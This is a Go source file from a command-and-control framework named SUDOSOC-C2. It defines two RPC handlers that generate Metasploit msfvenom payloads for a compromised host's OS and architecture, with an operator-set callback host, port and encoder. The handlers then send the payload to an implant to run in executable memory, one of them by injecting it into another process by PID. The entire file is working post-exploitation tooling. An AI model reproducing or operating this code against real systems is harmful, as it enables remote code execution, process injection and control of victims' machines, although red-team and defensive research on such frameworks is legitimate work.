package rpc

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2019  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/sudosoc/SUDOSOC-C2/protobuf/clientpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"github.com/sudosoc/SUDOSOC-C2/server/core"
	"github.com/sudosoc/SUDOSOC-C2/server/db"
	"github.com/sudosoc/SUDOSOC-C2/server/log"
	"github.com/sudosoc/SUDOSOC-C2/server/msf"
)

var (
	msfLog = log.NamedLogger("rpc", "msf")
)

// Msf - Helper function to execute MSF payloads on the remote system
func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*sudosocpb.Task, error) {
	var os string
	var arch string

	if req == nil || req.Request == nil {
		return nil, ErrMissingRequestField
	}

	if !req.Request.Async {
		session := core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		os = session.OS
		arch = session.Arch
	} else {
		beacon, err := db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s\n", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
		os = beacon.OS
		arch = beacon.Arch
	}

	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
		Os:         os,
		Arch:       msf.Arch(arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	})
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return nil, rpcError(err)
	}
	taskReq := &sudosocpb.TaskReq{
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
		Request:  req.Request,
	}
	resp := &sudosocpb.Task{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(taskReq, resp)
	if err != nil {
		return nil, rpcError(err)
	}
	return resp, nil
}

// MsfRemote - Inject an MSF payload into a remote process
func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*sudosocpb.Task, error) {
	var os string
	var arch string

	if req == nil || req.Request == nil {
		return nil, ErrMissingRequestField
	}

	if !req.Request.Async {
		session := core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		os = session.OS
		arch = session.Arch
	} else {
		beacon, err := db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s\n", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
		os = beacon.OS
		arch = beacon.Arch
	}

	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
		Os:         os,
		Arch:       msf.Arch(arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	})
	if err != nil {
		return nil, rpcError(err)
	}
	taskReq := &sudosocpb.TaskReq{
		Pid:      req.PID,
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
		Request:  req.Request,
	}
	resp := &sudosocpb.Task{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(taskReq, resp)
	if err != nil {
		return nil, rpcError(err)
	}
	return resp, nil
}
